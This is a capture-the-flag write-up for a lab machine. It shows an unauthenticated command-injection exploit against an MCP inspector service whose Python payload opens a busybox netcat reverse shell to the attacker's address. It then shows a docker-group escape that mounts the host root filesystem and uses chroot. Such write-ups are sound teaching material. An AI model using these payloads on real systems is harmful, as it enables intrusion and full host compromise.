# CTF – Kobold (Writeup)

## Context

Linux box exposing two vhosts, `mcp.kobold.htb` and `bin.kobold.htb`. The MCP service is vulnerable to CVE-2026-23744, giving an unauthenticated reverse shell. Root is a straightforward `docker` group membership → container mount of the host filesystem.

## Recon

No nmap file in my notes. The two virtual hosts in play:

- **`mcp.kobold.htb`** – an MCP inspector service vulnerable to CVE-2026-23744 (HTTPS).
- **`bin.kobold.htb`** – a paste/bin service (PrivateBin), relevant later because its files and the `privatebin` Docker image are what I use to escalate.

## Initial access – MCP RCE (CVE-2026-23744)

Same MCP-server command-injection class as elsewhere: `/api/mcp/connect` accepts a `serverConfig` describing a command to launch, with no restriction on what runs. `exploit.py` points it at `busybox nc ... -e /bin/bash`:

```python
target = "https://mcp.kobold.htb"
url = f'{target}/api/mcp/connect'
data = {
    "serverConfig": {
        "command": "busybox",
        "args": ["nc", "10.10.15.101", "5556", "-e", "/bin/bash"],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}
requests.post(url, json=data, verify=False)
```

Catch it on `nc -lvnp 5556`, then upgrade to a proper TTY:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Enumeration

Running `linpeas.sh` on the box flags the important detail: the account I landed on can use Docker (write/exec access around the PrivateBin deployment and the ability to operate as the `docker` group, with `rwx` on `/bin/sh`). Docker group membership is effectively root.

## Privilege escalation – docker group → host root

With `docker` access I start a container as UID 0 and bind-mount the host root filesystem into it, then `chroot` into it:

```
newgrp docker
docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
# inside the container:
chroot /mnt /bin/sh
```

Because the container runs as root and `/` is mounted at `/mnt`, `chroot /mnt` gives a root shell on the host filesystem — read `/root/root.txt`, add keys, whatever. I reuse the `privatebin/nginx-fpm-alpine:2.0.2` image that is already present on the box so nothing needs pulling.

## Conclusion

Unauthenticated MCP RCE (CVE-2026-23744) via `mcp.kobold.htb` for the foothold, then a classic `docker` group escape: mount the host `/` into a root container and `chroot` into it.

## Skills demonstrated

- Exploiting MCP-server command injection for RCE (CVE-2026-23744)
- TTY upgrade with `pty.spawn`
- Recognising `docker` group membership as a root-equivalent privilege
- Docker container escape by bind-mounting the host filesystem and `chroot` (GTFOBins-style)
